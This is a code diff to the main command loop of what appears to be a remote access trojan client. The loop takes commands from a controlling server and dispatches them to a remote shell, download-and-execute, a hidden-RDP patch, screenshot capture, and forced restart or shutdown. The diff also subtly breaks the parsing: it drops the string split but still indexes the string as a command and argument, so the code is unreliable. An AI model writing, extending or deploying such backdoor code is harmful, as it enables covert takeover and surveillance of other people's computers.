@@ -83,22 +83,24 @@ def main():
                 cmd = client.receive()
                 if cmd:
                     print("Command received: {}".format(cmd))
-                    cmd = cmd.split(maxsplit=1)
                     print(cmd)
-                    if cmd[0] == 'shell':
-                        Shell.shell(client, cmd[1])
-                    elif cmd[0] == 'restart':
-                        Power.restart()
-                    elif cmd[0] == 'shutdown':
-                        Power.shutdown()
-                    elif cmd[0] == 'execute':
-                        Execute.download_and_execute(client)
-                    elif cmd[0] == 'hrdp':
-                        HRDP.patch(client, cmd[1], SERVER_ADDRESS)
-                    elif cmd[0] == 'screenshot':
-                        Screenshot.take_screenshot(client)
+                    if len(cmd) > 1:
+                        if cmd[0] == 'shell':
+                            Shell.shell(client, cmd[1])
+                        elif cmd[0] == 'restart':
+                            Power.restart()
+                        elif cmd[0] == 'shutdown':
+                            Power.shutdown()
+                        elif cmd[0] == 'execute':
+                            Execute.download_and_execute(client)
+                        elif cmd[0] == 'hrdp':
+                            HRDP.patch(client, cmd[1], SERVER_ADDRESS)
+                        elif cmd[0] == 'screenshot':
+                            Screenshot.take_screenshot(client)
+                        else:
+                            client.send('[!] Unconfigured option')
                     else:
-                        client.send('[!] Unconfigured option')
+                        client.send('[!] Invalid command')
                 else:
                     sleep(1)
         else:
